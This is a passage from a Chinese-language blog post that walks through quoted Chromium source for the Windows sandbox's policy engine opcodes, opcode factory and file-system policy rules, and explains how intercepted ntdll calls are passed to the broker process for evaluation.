y, z) \</span></span><br><span class="line">  <span class="keyword">case</span> op:                       \</span><br><span class="line">    <span class="keyword">return</span> OpcodeEval&lt;op&gt;(x, y, z)</span><br><span class="line"></span><br><span class="line">EvalResult PolicyOpcode::EvaluateHelper(<span class="keyword">const</span> ParameterSet* parameters,</span><br><span class="line">                                        MatchContext* match) &#123;</span><br><span class="line">  <span class="keyword">switch</span> (opcode_id_) &#123;</span><br><span class="line">    OPCODE_EVAL(OP_ALWAYS_FALSE, <span class="keyword">this</span>, parameters, match);</span><br><span class="line">    OPCODE_EVAL(OP_ALWAYS_TRUE, <span class="keyword">this</span>, parameters, match);</span><br><span class="line">    OPCODE_EVAL(OP_NUMBER_MATCH, <span class="keyword">this</span>, parameters, match);</span><br><span class="line">    OPCODE_EVAL(OP_NUMBER_MATCH_RANGE, <span class="keyword">this</span>, parameters, match);</span><br><span class="line">    OPCODE_EVAL(OP_NUMBER_AND_MATCH, <span class="keyword">this</span>, parameters, match);</span><br><span class="line">    OPCODE_EVAL(OP_WSTRING_MATCH, <span class="keyword">this</span>, parameters, match);</span><br><span class="line">    OPCODE_EVAL(OP_ACTION, <span class="keyword">this</span>, parameters, match);</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> EVAL_ERROR;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <code>EvaluateHelper</code> 根据<code>opcode_id_</code>来分类调用<code>OPCODE_EVAL</code>来评估</p><h3 id="OPCODE-EVAL"><a href="#OPCODE-EVAL" class="headerlink" title="OPCODE_EVAL()"></a>OPCODE_EVAL()</h3><p>每个<code>opcodeid</code> 都有其对应的<code>OpcodeEval</code>实现</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//chromium/sandbox/win/src/policy_engine_opcodes.cc</span></span><br><span class="line"><span class="keyword">template</span> &lt;&gt;</span><br><span class="line">EvalResult OpcodeEval&lt;OP_ALWAYS_FALSE&gt;(PolicyOpcode* opcode,</span><br><span class="line">                                       <span class="keyword">const</span> ParameterSet* param,</span><br><span class="line">                                       MatchContext* context) &#123;</span><br><span class="line">  <span class="keyword">return</span> EVAL_FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;&gt;</span><br><span class="line">EvalResult OpcodeEval&lt;OP_ALWAYS_TRUE&gt;(PolicyOpcode* opcode,</span><br><span class="line">                                      <span class="keyword">const</span> ParameterSet* param,</span><br><span class="line">                                      MatchContext* context) &#123;</span><br><span class="line">  <span class="keyword">return</span> EVAL_TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;&gt;</span><br><span class="line">EvalResult OpcodeEval&lt;OP_ACTION&gt;(PolicyOpcode* opcode,</span><br><span class="line">                                 <span class="keyword">const</span> ParameterSet* param,</span><br><span class="line">                                 MatchContext* context) &#123;</span><br><span class="line">  <span class="keyword">int</span> action = <span class="number">0</span>;</span><br><span class="line">  opcode-&gt;GetArgument(<span class="number">0</span>, &amp;action);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">static_cast</span>&lt;EvalResult&gt;(action);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;&gt;</span><br><span class="line">EvalResult OpcodeEval&lt;OP_NUMBER_AND_MATCH&gt;(PolicyOpcode* opcode,</span><br><span class="line">                                           <span class="keyword">const</span> ParameterSet* param,</span><br><span class="line">                                           MatchContext* context) &#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> value = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (!param-&gt;Get(&amp;value))</span><br><span class="line">    <span class="keyword">return</span> EVAL_ERROR;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint32_t</span> number = <span class="number">0</span>;</span><br><span class="line">  opcode-&gt;GetArgument(<span class="number">0</span>, &amp;number);</span><br><span class="line">  <span class="keyword">return</span> (number &amp; value) ? EVAL_TRUE : EVAL_FALSE;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>如果是 match 类的 ID，其最终就是 opcode内存储的<code>Argument</code>和<code>param</code>的比较，返回 TRUE or FALSE</p><p>如果是 OP_ACTION，则返回其对应的<code>EvalResult</code>，如：askbroker.</p><h2 id="OpcodeFactory"><a href="#OpcodeFactory" class="headerlink" title="OpcodeFactory"></a>OpcodeFactory</h2><p>opcode 的一个工程类，用来make opcode</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//chromium/sandbox/win/src/policy_engine_opcodes.h</span></span><br><span class="line"><span class="comment">// Factory通过使用构造函数中给定的内存块创建操作码来工作。 </span></span><br><span class="line"><span class="comment">//操作码本身是从内存的开头（顶部）分配的，而操作码需要的任何字符串都是从内存的结尾（底部）分配的。</span></span><br><span class="line"><span class="comment">// In essence:</span></span><br><span class="line"><span class="comment">//   low address ---&gt; [opcode 1]</span></span><br><span class="line"><span class="comment">//                    [opcode 2]</span></span><br><span class="line"><span class="comment">//                    [opcode 3]</span></span><br><span class="line"><span class="comment">//                    |        | &lt;--- memory_top_</span></span><br><span class="line"><span class="comment">//                    | free   |</span></span><br><span class="line"><span class="comment">//                    |        |</span></span><br><span class="line"><span class="comment">//                    |        | &lt;--- memory_bottom_</span></span><br><span class="line"><span class="comment">//                    [string 1]</span></span><br><span class="line"><span class="comment">//   high address --&gt; [string 2]</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OpcodeFactory</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// memory: 指向创建操作码的内存块的基指针。</span></span><br><span class="line">    <span class="comment">// memory_size: chunk size</span></span><br><span class="line">  OpcodeFactory(<span class="keyword">char</span>* memory, <span class="keyword">size_t</span> memory_size) : memory_top_(memory) &#123;</span><br><span class="line">    memory_bottom_ = &amp;memory_top_[memory_size];</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="comment">// policy:包含创建操作码的原始内存</span></span><br><span class="line">  OpcodeFactory(PolicyBuffer* policy, <span class="keyword">size_t</span> memory_size) &#123;</span><br><span class="line">    memory_top_ = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">char</span>*&gt;(&amp;policy-&gt;opcodes[<span class="number">0</span>]);</span><br><span class="line">    memory_bottom_ = &amp;memory_top_[memory_size];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">size_t</span> <span class="title">memory_size</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    DCHECK_GE(memory_bottom_, memory_top_);</span><br><span class="line">    <span class="keyword">return</span> memory_bottom_ - memory_top_;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Creates an OpAlwaysFalse opcode.</span></span><br><span class="line">  <span class="function">PolicyOpcode* <span class="title">MakeOpAlwaysFalse</span><span class="params">(<span class="keyword">uint32_t</span> options)</span></span>;</span><br><span class="line">  <span class="function">PolicyOpcode* <span class="title">MakeOpAlwaysTrue</span><span class="params">(<span class="keyword">uint32_t</span> options)</span></span>;</span><br><span class="line">  <span class="function">PolicyOpcode* <span class="title">MakeOpAction</span><span class="params">(EvalResult action, <span class="keyword">uint32_t</span> options)</span></span>;</span><br><span class="line">  <span class="function">PolicyOpcode* <span class="title">MakeOpNumberMatch</span><span class="params">(<span class="keyword">int16_t</span> selected_param,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  <span class="keyword">uint32_t</span> match,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  <span class="keyword">uint32_t</span> options)</span></span>;</span><br><span class="line">  <span class="function">PolicyOpcode* <span class="title">MakeOpVoidPtrMatch</span><span class="params">(<span class="keyword">int16_t</span> selected_param,</span></span></span><br><span class="line"><span class="function"><span class="params">                                   <span class="keyword">const</span> <span class="keyword">void</span>* match,</span></span></span><br><span class="line"><span class="function"><span class="params">                                   <span class="keyword">uint32_t</span> options)</span></span>;</span><br><span class="line">  <span class="function">PolicyOpcode* <span class="title">MakeOpNumberMatchRange</span><span class="params">(<span class="keyword">int16_t</span> selected_param,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       <span class="keyword">uint32_t</span> lower_bound,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       <span class="keyword">uint32_t</span> upper_bound,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       <span class="keyword">uint32_t</span> options)</span></span>;</span><br><span class="line">  <span class="function">PolicyOpcode* <span class="title">MakeOpWStringMatch</span><span class="params">(<span class="keyword">int16_t</span> selected_param,</span></span></span><br><span class="line"><span class="function"><span class="params">                                   <span class="keyword">const</span> <span class="keyword">wchar_t</span>* match_str,</span></span></span><br><span class="line"><span class="function"><span class="params">                                   <span class="keyword">int</span> start_position,</span></span></span><br><span class="line"><span class="function"><span class="params">                                   StringMatchOptions match_opts,</span></span></span><br><span class="line"><span class="function"><span class="params">                                   <span class="keyword">uint32_t</span> options)</span></span>;</span><br><span class="line">  <span class="function">PolicyOpcode* <span class="title">MakeOpNumberAndMatch</span><span class="params">(<span class="keyword">int16_t</span> selected_param,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     <span class="keyword">uint32_t</span> match,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     <span class="keyword">uint32_t</span> options)</span></span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="function">PolicyOpcode* <span class="title">MakeBase</span><span class="params">(OpcodeID opcode_id,</span></span></span><br><span class="line"><span class="function"><span class="params">                         <span class="keyword">uint32_t</span> options,</span></span></span><br><span class="line"><span class="function"><span class="params">                         <span class="keyword">int16_t</span> selected_param)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">ptrdiff_t</span> <span class="title">AllocRelative</span><span class="params">(<span class="keyword">void</span>* start, <span class="keyword">const</span> <span class="keyword">wchar_t</span>* str, <span class="keyword">size_t</span> length)</span></span>;</span><br><span class="line">  <span class="keyword">char</span>* memory_top_;</span><br><span class="line">  <span class="keyword">char</span>* memory_bottom_;</span><br><span class="line">  DISALLOW_COPY_AND_ASSIGN(OpcodeFactory);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中比较重要的是<code>MakeBase()</code>，所有的 make，最后都会调用这个函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PolicyOpcode* <span class="title">OpcodeFactory::MakeBase</span><span class="params">(OpcodeID opcode_id,</span></span></span><br><span class="line"><span class="function"><span class="params">                                      <span class="keyword">uint32_t</span> options,</span></span></span><br><span class="line"><span class="function"><span class="params">                                      <span class="keyword">int16_t</span> selected_param)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (memory_size() &lt; <span class="keyword">sizeof</span>(PolicyOpcode))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// opcode从top开始向下占用buffer</span></span><br><span class="line">  PolicyOpcode* opcode = <span class="keyword">new</span> (memory_top_) PolicyOpcode();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill in the standard fields, that every opcode has.</span></span><br><span class="line">  memory_top_ += <span class="keyword">sizeof</span>(PolicyOpcode);</span><br><span class="line">  opcode-&gt;opcode_id_ = opcode_id;<span class="comment">// 标记 opcode type</span></span><br><span class="line">  opcode-&gt;SetOptions(options);<span class="comment">// 标记 opcode options</span></span><br><span class="line">  <span class="comment">// 传入的selected_param表示用于和该PolicyOpcode比较的参数在ParameterSet中是第几个，也就是索引</span></span><br><span class="line">  opcode-&gt;parameter_ = selected_param;</span><br><span class="line">  <span class="keyword">return</span> opcode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Filesystem"><a href="#Filesystem" class="headerlink" title="Filesystem"></a>Filesystem</h1><p>Target在执行5个文件系统相关的API时，会因为Interceptions的部署（该子系统由broker远程部署(service call)）而调用hook函数，hook函数通过SharedMem IPC与broker通信，将调用参数传给broker，broker此后通过dispatcher分发找到对应子系统的dispatcher，子系统dispatcher会匹配调用参数并调用一早便注册好的callback，callback会进行Low-level policy的Evaluate鉴权，并进一步调用low-level policy的业务处理函数，根据鉴权结果来执行API，并在CrossCallResult回执结果。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//chromium/sandbox/win/src/filesystem_policy.h</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileSystemPolicy</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="comment">// 创建所需的低级策略规则来评估文件 IO 的高级策略规则，尤其是文件打开或创建操作。</span></span><br><span class="line">  <span class="comment">// &#x27;name&#x27; 是文件名或目录名。 “语义”。 </span></span><br><span class="line">  <span class="comment">// &#x27;semantics&#x27; 是打开或创建所需的语义</span></span><br><span class="line">  <span class="comment">//&#x27;policy&#x27; 是将要添加规则的策略生成器。</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">GenerateRules</span><span class="params">(<span class="keyword">const</span> <span class="keyword">wchar_t</span>* name,</span></span></span><br><span class="line"><span class="function"><span class="params">                            TargetPolicy::Semantics semantics,</span></span></span><br><span class="line"><span class="function"><span class="params">                            LowLevelPolicy* policy)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Add basic file system rules.</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">SetInitialRules</span><span class="params">(LowLevelPolicy* policy)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// IPC 收到 creat file 请求时的操作</span></span><br><span class="line">  <span class="comment">// &#x27;client_info&#x27; :发出请求的目标进程。</span></span><br><span class="line">  <span class="comment">// &#x27;eval_result&#x27; : 要完成的预期策略操作。</span></span><br><span class="line">  <span class="comment">// &#x27;file&#x27; : 目标文件或目录。</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">CreateFileAction</span><span class="params">(EvalResult eval_result,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="keyword">const</span> ClientInfo&amp; client_info,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">wstring</span>&amp; file,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="keyword">uint32_t</span> attributes,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="keyword">uint32_t</span> desired_access,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="keyword">uint32_t</span> file_attributes,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="keyword">uint32_t</span> share_access,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="keyword">uint32_t</span> create_disposition,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="keyword">uint32_t</span> create_options,</span></span></span><br><span class="line"><span class="function"><span class="params">                               HANDLE* handle,</span></span></span><br><span class="line"><span class="function"><span class="params">                               NTSTATUS* nt_status,</span></span></span><br><span class="line"><span class="function"><span class="params">                               ULONG_PTR* io_information)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// IPC 收到 open file 请求时的操作</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">OpenFileAction</span><span class="params">(EvalResult eval_result,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">const</span> ClientInfo&amp; client_info,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">wstring</span>&amp; file,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">uint32_t</span> attributes,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">uint32_t</span> desired_access,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">uint32_t</span> share_access,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">uint32_t</span> open_options,</span></span></span><br><span class="line"><span class="function"><span class="params">                             HANDLE* handle,</span></span></span><br><span class="line"><span class="function"><span class="params">                             NTSTATUS* nt_status,</span></span></span><br><span class="line"><span class="function"><span class="params">                             ULONG_PTR* io_information)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// IPC 收到 Query 请求时的操作</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">QueryAttributesFileAction</span><span class="params">(EvalResult eval_result,</span></span></span><br><span class="line"><span class="function"><span class="params">                                        <span class="keyword">const</span> ClientInfo&amp; client_info,</span></span></span><br><span class="line"><span class="function"><span class="params">                                        <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">wstring</span>&amp; file,</span></span></span><br><span class="line"><span class="function"><span class="params">                                        <span class="keyword">uint32_t</span> attributes,</span></span></span><br><span class="line"><span class="function"><span class="params">                                        FILE_BASIC_INFORMATION* file_info,</span></span></span><br><span class="line"><span class="function"><span class="params">                                        NTSTATUS* nt_status)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// IPC 收到 Query full请求时的操作</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">QueryFullAttributesFileAction</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">      EvalResult eval_result,</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">const</span> ClientInfo&amp; client_info,</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">wstring</span>&amp; file,</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">uint32_t</span> attributes,</span></span></span><br><span class="line"><span class="function"><span class="params">      FILE_NETWORK_OPEN_INFORMATION* file_info,</span></span></span><br><span class="line"><span class="function"><span class="params">      NTSTATUS* nt_status)</span></span>;</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// // IPC收到的set_info 请求时的操作</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">SetInformationFileAction</span><span class="params">(EvalResult eval_result,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       <span class="keyword">const</span> ClientInfo&amp; client_info,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       HANDLE target_file_handle,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       <span class="keyword">void</span>* file_info,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       <span class="keyword">uint32_t</span> length,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       <span class="keyword">uint32_t</span> info_class,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       IO_STATUS_BLOCK* io_block,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       NTSTATUS* nt_status)</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>chrome的Windows版Sandbox是利用系统的</p><ul><li><p>user32!CreateDesktopW</p></li><li><p>kernel32!CreateJobObjectW</p></li><li><p>advapi32!CreateRestrictedToken</p></li><li><p>advapi32!CreateProcessAsUserW</p></li><li><p>advapi32!SetThreadToken</p></li><li><p>advapi32!RevertToSelf</p></li></ul><p>这些API为每个网页单独建立一个权限受限的renderer子进程专门用来解析网页, 如果网页有什么越轨的行为就销毁这个renderer子进程. 因为renderer子进程权限太低无法进行诸如下载上传文件这些操作, chrome改写了renderer子进程10个API, 如果参数合乎policy要求就让正常权限的browser主进程代为完成。</p><ul><li><p>ntdll!NtCreateFile</p></li><li><p>ntdll!NtOpenFile</p></li><li><p>ntdll!NtQueryAttributesFile</p></li><li><p>ntdll!NtQueryFullAttributesFile</p></li><li><p>ntdll!NtSetInformationFile</p></li><li><p>ntdll!NtOpenThread</p></li><li><p>ntdll!NtOpenProcess</p></li><li><p>ntdll!NtOpenProcessToken</p></li><li><p>ntdll!NtSetInformationThread</p></li><li><p>ntdll!NtOpenThreadToken</p></li></ul><h2 id="FileSystemPolicy-GenerateRules"><a href="#FileSystemPolicy-GenerateRules" class="headerlink" title="FileSystemPolicy::GenerateRules"></a>FileSystemPolicy::GenerateRules</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//chromium/sandbox/win/src/filesystem_policy.cc</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">FileSystemPolicy::GenerateRules</span><span class="params">(<span class="keyword">const</span> <span class="keyword">wchar_t</span>* name,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     TargetPolicy::Semantics semantics,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     LowLevelPolicy* policy)</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="built_in">std</span>::<span class="built_in">wstring</span> <span class="title">mod_name</span><span class="params">(name)</span></span>;</span><br><span class="line">  <span class="keyword">if</span> (mod_name.empty()) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//处理 mod_name。</span></span><br><span class="line">  <span class="keyword">if</span> (!PreProcessName(&amp;mod_name)) &#123;</span><br><span class="line">    <span class="comment">// The path to be added might contain a reparse point.</span></span><br><span class="line">    NOTREACHED();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// TODO(cpu) bug 32224: This prefix add is a hack because we don&#x27;t have the</span></span><br><span class="line">  <span class="comment">// infrastructure to normalize names. In any case we need to escape the</span></span><br><span class="line">  <span class="comment">// question marks.</span></span><br><span class="line">  <span class="keyword">if</span> (_wcsnicmp(mod_name.c_str(), kNTDevicePrefix, kNTDevicePrefixLen)) &#123;</span><br><span class="line">    mod_name = FixNTPrefixForMatch(mod_name);</span><br><span class="line">    name = mod_name.c_str();</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 设定 ASK_broker</span></span><br><span class="line">  EvalResult result = ASK_BROKER;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// List of supported calls for the filesystem.</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">unsigned</span> kCallNtCreateFile = <span class="number">0x1</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">unsigned</span> kCallNtOpenFile = <span class="number">0x2</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">unsigned</span> kCallNtQueryAttributesFile = <span class="number">0x4</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">unsigned</span> kCallNtQueryFullAttributesFile = <span class="number">0x8</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">unsigned</span> kCallNtSetInfoRename = <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">  DWORD rule_to_add = kCallNtOpenFile | kCallNtCreateFile |</span><br><span class="line">                      kCallNtQueryAttributesFile |</span><br><span class="line">                      kCallNtQueryFullAttributesFile | 